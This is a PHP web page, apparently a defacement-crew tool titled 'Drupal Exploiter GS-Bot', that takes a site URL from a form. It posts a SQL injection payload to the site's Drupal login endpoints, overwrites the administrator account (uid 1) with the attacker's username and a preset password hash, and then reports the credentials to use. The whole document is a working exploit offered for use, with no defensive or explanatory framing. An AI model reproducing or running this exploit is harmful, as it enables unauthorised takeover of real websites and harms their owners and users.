<!Doctype HTML>
<html>
<head>
    <title>Drupal Exploiter GS-Bot |CODED FALLAGASSRINI</title>
    <style type="text/css">
    .mymargin{
        margin-top:100px;
        color:white;
        font-family: monospace;
    }
    body{
        background-color:black;
    }
    </style>
</head>
<body>
    <div class="mymargin">
        <center>
    <form method="GET" action="">
        Site : <input type="text" name="url" placeholder="Example: www.site.com">
        <input type="submit" name="submit" value="submit">
    </form>
    <br>
<?php
error_reporting(0);
if(isset($_GET['submit'])){

    $url = $_GET['url'];
    $post_data = "name[0;update users set name %3D 'gassrini' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status
%3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '/user/login/', null, $ctx);
     echo "<h3>Testing at \"/user/login/</h3>\"";
    if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data)|| (stristr($data, 'FcUk Crap') && $data)) {
        echo "Success! Log in with username \"gassrini\" and password \"admin\" at {$url}/user/login";
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
    }
}

if(isset($_GET['submit'])){

    $url = "http://".$_GET['url']."/";
    $post_data = "name[0;update users set name %3D 'gassrini' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status
%3D'1' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '?q=node&destination=node', null, $ctx);
     echo "<h3>Testing at \"Index</h3>\"";
    if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
        echo "Success! Log in with username \"gassrini\" and password \"admin\" at {$url}/user/login";
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
    }
}

?>
    </div>

</body>
</html>
